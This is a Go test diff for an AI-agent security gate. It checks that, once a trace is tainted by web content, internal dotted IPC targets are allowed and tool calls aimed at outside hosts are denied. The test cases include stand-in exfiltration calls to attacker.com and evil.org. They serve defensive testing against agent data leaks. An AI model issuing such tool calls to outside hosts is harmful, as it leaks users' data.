@@ -1281,3 +1281,82 @@ CMD ["./start.sh"]`,
 		t.Errorf("TestDeveloperPayloadCorpus took %v, want < 100ms", elapsed)
 	}
 }
+
+func TestInternalIdentifierIPC(t *testing.T) {
+	ctx := context.Background()
+	led := NewLedger()
+	stamp := NewStampGate(led, Policy{})
+	sink := NewSinkGate(led, Policy{})
+
+	// Taint the trace first
+	read := &abi.ToolCall{Tool: "read_webpage", TraceID: "ipc-trace"}
+	stamp.Admit(ctx, read, resultOf("external content"))
+
+	// Calls with dotted worker names and standard multi-agent IPC keys
+	cases := []struct {
+		name      string
+		tool      string
+		args      string
+		wantAllow bool
+	}{
+		{
+			name:      "send_input with worker.1 target",
+			tool:      "send_input",
+			args:      `{"target":"worker.1","worker_id":"agent.test.1","subagent_type":"tester","message":"ping"}`,
+			wantAllow: true,
+		},
+		{
+			name:      "send_input with agent.main target",
+			tool:      "send_input",
+			args:      `{"target":"agent.main","agent_id":"coordinator.1","channel":"internal.ipc","data":"task ready"}`,
+			wantAllow: true,
+		},
+		{
+			name:      "custom tool with subagent dotted handle",
+			tool:      "dispatch_worker",
+			args:      `{"target":"subagent.tester.2","task":"run unit tests"}`,
+			wantAllow: true,
+		},
+		{
+			name:      "send_input with external URL in target",
+			tool:      "send_input",
+			args:      `{"target":"https://attacker.com/leak","message":"data"}`,
+			wantAllow: false,
+		},
+		{
+			name:      "send_input with external FQDN in target",
+			tool:      "send_input",
+			args:      `{"target":"worker.attacker.com","message":"data"}`,
+			wantAllow: false,
+		},
+		{
+			name:      "send_input with external FQDN in channel",
+			tool:      "send_input",
+			args:      `{"target":"agent.main","channel":"coordinator.evil.org","message":"data"}`,
+			wantAllow: false,
+		},
+		{
+			name:      "dispatch_worker with external FQDN in target",
+			tool:      "dispatch_worker",
+			args:      `{"target":"worker.attacker.com","task":"leak"}`,
+			wantAllow: false,
+		},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			call := &abi.ToolCall{
+				TraceID: "ipc-trace",
+				Tool:    tc.tool,
+				Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(tc.args)},
+			}
+			v := sink.Adjudicate(ctx, call)
+			if tc.wantAllow && v.Kind == abi.VerdictDeny {
+				t.Fatalf("%s was denied: %+v", tc.name, v)
+			}
+			if !tc.wantAllow && v.Kind != abi.VerdictDeny {
+				t.Fatalf("%s was allowed (want deny): %+v", tc.name, v)
+			}
+		})
+	}
+}
